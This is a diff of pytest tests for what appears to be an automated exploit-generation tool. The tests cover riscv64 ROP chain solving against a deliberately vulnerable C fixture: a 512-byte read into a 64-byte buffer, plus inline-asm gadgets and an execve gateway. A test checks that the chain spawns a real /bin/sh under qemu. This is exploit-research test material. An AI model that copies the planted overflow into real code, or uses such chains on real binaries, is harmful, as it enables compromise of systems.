@@ -436,3 +436,108 @@ def test_autopilot_files_execve_solver_l3_aarch64(store, tmp_path, monkeypatch):
     assert l3, "the autopilot filed no verified L3"
     fid = FindingDAO(store.conn).id_for_dedup(t.id, f"exploit:aarch64-execve-syscall-solver:{t.id}")
     assert fid, "the autopilot's L3 was not filed by the execve semantic solver"
+
+
+# ---- riscv64 execve-syscall (now that find_riscv64_execve_site exists) ---------------------------
+# The riscv execve gateway `li a7,221; ecall` + clean arg-zero/value-loader/caller gadgets, supplied by
+# inline asm (stock riscv glibc has neither a findable gateway nor a clean a2/envp-zeroing epilogue --
+# a2 is caller-saved and reachable only as a2<-a0 -- so the solver honestly declines there).
+_ASM_EXECVE_RV = (
+    '#include <unistd.h>\n'
+    'char binsh[] = "/bin/sh";\n'
+    '__asm__(".text\\n"\n'
+    ' ".global g_argz\\n g_argz: ld a1,16(sp)\\n ld a2,24(sp)\\n ld ra,8(sp)\\n addi sp,sp,32\\n ret\\n"\n'   # L0
+    ' ".global g_load\\n g_load: ld s0,16(sp)\\n ld s1,24(sp)\\n ld ra,8(sp)\\n addi sp,sp,32\\n ret\\n"\n'   # LB
+    ' ".global g_call\\n g_call: mv a0,s0\\n jr s1\\n"\n'                                                     # caller
+    ' ".global g_exec\\n g_exec: li a7,221\\n ecall\\n");\n'                                                  # gateway
+    'void vuln(void){ char b[64]; read(0,b,512); }\n'
+    'int main(void){ vuln(); return 0; }\n')
+
+
+def test_find_riscv64_execve_site():
+    """find_riscv64_execve_site returns the `li a7,221` va of a `li a7,221; ecall` pair (the riscv
+    execve thunk), searched at 2-byte alignment past compressed padding."""
+    seg = ((0x00000013).to_bytes(4, "little")             # nop (addi x0,x0,0) padding
+           + (0x0DD00893).to_bytes(4, "little")           # li a7,221 (addi a7,x0,221)
+           + (0x00000073).to_bytes(4, "little"))          # ecall
+    orig = rop._loads
+    rop._loads = lambda data: [(0, len(seg), 0x11000, 1)]
+    try:
+        assert rop.find_riscv64_execve_site(seg) == 0x11000 + 4    # the li, not the ecall
+    finally:
+        rop._loads = orig
+
+
+def test_lr_execve_solver_shell_riscv64(tmp_path):
+    """solve_lr_execve_chain composes execve("/bin/sh",0,0) on riscv64 and spawns a REAL shell under
+    qemu + a negative control -- the multi-register chain reaching `li a7,221; ecall` with a0=&binsh,
+    a1=a2=0. The clean arg-zeroing loader comes from inline asm (stock glibc has none), proving the
+    riscv wiring composes WHERE THE GADGETS EXIST; on stock glibc it declines (the a2/envp wall)."""
+    if not (_RV_GCC and _RV_QEMU and gadget_emu.available()):
+        pytest.skip("needs riscv64 toolchain + qemu + unicorn/capstone")
+    src = tmp_path / "v.c"
+    src.write_text(_ASM_EXECVE_RV)
+    exe = tmp_path / "v"
+    if subprocess.run([_RV_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
+                       str(src), "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("cannot build riscv64 execve fixture")
+    data = exe.read_bytes()
+    binsh = rop.find_string(data, b"/bin/sh")
+    gateway = rop.find_riscv64_execve_site(data)
+    assert binsh and gateway
+    cap = make_qemu_capture(exe, "riscv64", "stdin", [], 12, endianness="little", bits=64)
+    rec = primitive.recover_ip_offset(cap(bytes(primitive.cyclic(300))), 300, endian="little", word=8)
+    offset = rec[0] if rec else 72
+    cands = rop_solver.solve_lr_execve_chain(data, "riscv64", binsh=binsh, gateway=gateway,
+                                             offset=offset)
+    assert cands, "solver composed no riscv64 execve chain"
+    hit = None
+    for c in cands:
+        m = attribution.make_code_markers()
+        if m.proves(es._qemu_shell_detonate(exe, "riscv64", "little", 64, c["payload"], m, 12.0)):
+            hit = c
+            break
+    assert hit, "no solver-composed riscv64 execve chain spawned a shell"
+    neg = rop_solver.solve_lr_execve_chain(data, "riscv64", binsh=binsh ^ 0xFFFF, gateway=gateway,
+                                           offset=offset)
+    nc = next((c for c in neg if (c["l0"], c["lb"], c["caller"], c["base"])
+               == (hit["l0"], hit["lb"], hit["caller"], hit["base"])), None)
+    assert nc is not None
+    m2 = attribution.make_code_markers()
+    assert not m2.proves(es._qemu_shell_detonate(exe, "riscv64", "little", 64, nc["payload"], m2, 12.0))
+
+
+def test_lr_execve_solver_stage_files_l3_riscv64(store, tmp_path):
+    """The build_exploit STAGE files the solver-composed execve L3 on riscv64. strategy="execve"
+    isolates it: riscv has no pattern execve clause, and with no `system` the ret2libc paths decline,
+    so the ONLY execve clause that can fire is the semantic solver -- proving the riscv wiring end to
+    end (compose -> reach `li a7,221; ecall` with a0=&"/bin/sh", a1=a2=0 + a negative control -> L3)."""
+    if not (_RV_GCC and _RV_QEMU and gadget_emu.available()):
+        pytest.skip("needs riscv64 toolchain + qemu + unicorn/capstone")
+    from lykos.analyze import register
+    from lykos.analyze.ingest import enqueue_triage, ingest
+    from lykos.analyze.poc import enqueue_exploit
+    from lykos.db.dao import FindingDAO, PocDAO
+    from lykos.jobs import JobConfig, JobQueue, WorkerPool
+    src = tmp_path / "v.c"
+    src.write_text(_ASM_EXECVE_RV)
+    exe = tmp_path / "v"
+    if subprocess.run([_RV_GCC, "-no-pie", "-static", "-fno-stack-protector", "-w",
+                       str(src), "-o", str(exe)], capture_output=True).returncode:
+        pytest.skip("cannot build riscv64 execve fixture")
+    register()
+    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
+    pool.start()
+    try:
+        t = ingest(store, store.cases.create("rvexec").id, exe, filename="v")
+        q = JobQueue(store.conn)
+        enqueue_triage(q, t, force=True)
+        assert pool.wait_idle(180)
+        run = enqueue_exploit(q, t, params={"strategy": "execve", "timeout": 14})
+        assert pool.wait_idle(600) and q.runs.get(run.id).status == "done"
+    finally:
+        pool.stop(grace=3.0)
+    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
+    assert l3, "the stage filed no solver-composed riscv64 execve L3"
+    fid = FindingDAO(store.conn).id_for_dedup(t.id, f"exploit:riscv64-execve-syscall-solver:{t.id}")
+    assert fid, "L3 filed but not via the riscv64 execve semantic solver"
